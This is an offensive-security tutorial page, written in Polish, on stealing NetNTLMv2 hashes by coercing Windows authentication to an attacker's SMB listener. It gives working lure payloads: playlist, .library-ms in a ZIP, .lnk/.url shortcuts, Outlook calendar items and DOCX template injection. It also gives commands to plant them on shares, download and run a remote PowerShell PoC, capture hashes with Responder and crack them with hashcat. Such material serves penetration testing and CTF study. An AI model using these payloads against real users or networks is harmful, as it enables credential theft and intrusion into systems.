# Miejsca do kradzieży NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od pobrania pliku Microsoft Word online po źródło ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Zapisywalny udział SMB + przynęty UNC wywoływane przez Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisać na udziale, który użytkownicy lub zadania zaplanowane przeglądają w Explorer**, wrzuć pliki, których metadane wskazują na Twój UNC (np. `\\ATTACKER\share`). Renderowanie folderu powoduje **implicit SMB authentication** i leaks a **NetNTLMv2** do Twojego listenera.

1. **Wygeneruj przynęty** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Upuść je na zapisywalnym udziale** (dowolny folder, który ofiara otworzy):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows może jednocześnie sięgać po kilka plików; wszystko, co Explorer podgląda (`BROWSE TO FOLDER`), nie wymaga kliknięć.

### Playlisty Windows Media Player (.ASX/.WAX)

Jeśli uda ci się skłonić cel do otwarcia lub podglądu kontrolowanej przez ciebie playlisty Windows Media Player, możesz spowodować leak Net‑NTLMv2, kierując wpis na ścieżkę UNC. WMP spróbuje pobrać odwołane media przez SMB i uwierzytelni się automatycznie.

Przykładowy payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Przepływ zbierania i cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### .library-ms osadzony w ZIP — NTLM leak (CVE-2025-24071/24055)

Windows Explorer nieprawidłowo obsługuje pliki .library-ms, gdy są otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie/uruchamianie .library-ms znajdującego się w ZIP powoduje, że Explorer enumeruje ścieżkę UNC i wysyła uwierzytelnienie NTLM do atakującego. To skutkuje NetNTLMv2, które można złamać offline lub potencjalnie relayed.

Minimalny .library-ms wskazujący na UNC atakującego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Kroki operacyjne
- Utwórz plik .library-ms z powyższym XML (ustaw swój IP/nazwę hosta).
- Spakuj go (na Windows: Send to → Compressed (zipped) folder) i dostarcz ZIP do celu.
- Uruchom NTLM capture listener i poczekaj, aż ofiara otworzy .library-ms z wnętrza ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows obsługiwał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała na UNC path (np. \\attacker\share\alert.wav), Outlook łączył się z SMB share po uruchomieniu przypomnienia, powodując leak Net‑NTLMv2 użytkownika bez żadnego kliknięcia. Łatka została wydana 14 marca 2023 r., ale nadal ma duże znaczenie dla starszych/niezmienionych środowisk oraz w kontekście historycznej analizy incydentów.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Strona nasłuchująca:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Uwagi
- Ofiara musi mieć uruchomiony Outlook for Windows w chwili uruchomienia przypomnienia.
- Ten leak zwraca Net‑NTLMv2 odpowiedni do offline cracking lub relay (nie pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer wyświetla ikony skrótów automatycznie. Niedawne badania wykazały, że nawet po kwietniowej poprawce Microsoft z 2025 roku dotyczącej UNC‑icon shortcuts, nadal można było wywołać uwierzytelnianie NTLM bez klikania przez umieszczenie celu skrótu na UNC path i pozostawienie ikony lokalnie (bypass poprawki otrzymał CVE‑2025‑50154). Sam widok folderu powoduje, że Explorer pobiera metadane z zdalnego celu, wysyłając NTLM do atakującego SMB server.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload skrótu programu (.lnk) przez PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Sposoby dostarczenia
- Umieść skrót w pliku ZIP i nakłoń ofiarę, aby go przeglądnęła.
- Umieść skrót na zapisywalnym udziale sieciowym, który ofiara otworzy.
- Połącz z innymi plikami przynętowymi w tym samym folderze, aby Explorer podglądał te elementy.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli ustawisz dołączony szablon na ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie do SMB.

Minimalne zmiany w relacjach DOCX (inside word/):

1) Edytuj word/settings.xml i dodaj referencję do dołączonego szablonu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edytuj word/_rels/settings.xml.rels i ustaw rId1337 na swój UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Spakuj ponownie do .docx i dostarcz. Uruchom SMB capture listener i poczekaj na otwarcie.

Na pomysły po przechwyceniu dotyczące relaying lub nadużywania NTLM, zobacz:

{{#ref}}
README.md
{{#endref}}


## Źródła
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
